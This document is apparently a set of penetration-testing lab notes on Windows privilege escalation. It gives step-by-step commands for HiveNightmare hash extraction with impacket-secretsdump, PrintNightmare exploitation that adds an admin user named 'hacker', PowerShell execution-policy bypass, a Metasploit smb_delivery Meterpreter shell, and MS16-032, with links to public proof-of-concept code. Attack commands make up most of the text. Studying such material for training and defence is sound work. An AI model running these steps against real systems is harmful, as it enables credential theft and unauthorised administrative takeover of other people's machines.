# Windows Server 2000, 2003, and 2008 and Windows XP and Vista 
```
MS08-067
```
if we land on a host where port 445 is firewalled off
```
MS17-010
```
# Windows 10
```
CVE-2021-36934 HiveNightmare, aka SeriousSam
```
## Checking Permissions on the SAM File
We can check for this vulnerability using icacls to check permissions on the SAM file. In our case, we have a vulnerable version as the file is readable by the BUILTIN\Users group
```
icacls c:\windows\system32\config\SAM
```
```
BUILTIN\Users: (RX)
```
### Performing Attack and Parsing Password Hashes
```
https://github.com/GossiTheDog/HiveNightmare
```
This PoC can be used to perform the attack, creating copies of the aforementioned registry hives:
```
PS C:\Users\htb-student\Desktop> .\HiveNightmare.exe
```
These copies can then be transferred back to the attack host, where impacket-secretsdump is used to extract the hashes:
```
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```
# Domain Controllers, Windows 7 and 10
## CVE-2021-1675/CVE-2021-34527 PrintNightmar
```
https://github.com/cube0x0/CVE-2021-1675
```
```
https://github.com/calebstewart/CVE-2021-1675
```
1. Checking for Spooler Service
```
PS C:\htb> ls \\localhost\pipe\spoolss
```
2. If it is not running, we will receive a "path does not exist" error.
3. bypassing the execution policy on the target host
```
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
```
4. Adding Local Admin with PrintNightmare PowerShell PoC
```
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
```
```
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```
5. Confirming New Admin User
```
net user hacker
```
â‡’ You have to login as the user hacker in order to gave Administrator privileges and run a cmd as Administrator
```
impacket-rpcdump @<ip>
```
1. Search for MS-RPRN: If it exists then it is vulnerable to PrintNightmare
# Examining Installed Updates
We can examine the installed updates in several ways. Below are three separate commands we can use.
```
PS C:\htb> systeminfo
```
```
PS C:\htb> wmic qfe list brief
```
```
PS C:\htb> Get-Hotfix
```
# Dealing with End of Life Systems
```
C:\htb> wmic qfe
```
## Windows Server 2008
### Enumeration scripts
#### Sherlock
```
https://github.com/rasta-mouse/Sherlock
```
```
Set-ExecutionPolicy bypass -Scope process
```
```
Import-Module .\Sherlock.ps1
```
```
Find-AllVulns
```
Obtaining a Meterpreter Shell
```
exploit windows/smb/smb_delivery
```
Searching for Local Privilege Escalation Exploit
Use the Vulnerable scripts found in Sherlock
Pay attention to migrating to x64 
#### Windows-Exploit-Suggester
```
https://github.com/Riqky/Windows-Exploit-Suggester
```
## Windows 7
### Gathering Systeminfo Command Output
```
C:\ systeminfo
```
Copy the output and save it on your host machine
```
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
```
### MS16-032
```
PS C:\htb> Set-ExecutionPolicy bypass -scope process
```
```
PS C:\htb> Import-Module .\Invoke-MS16-032.ps1
```
```
PS C:\htb> Invoke-MS16-032
```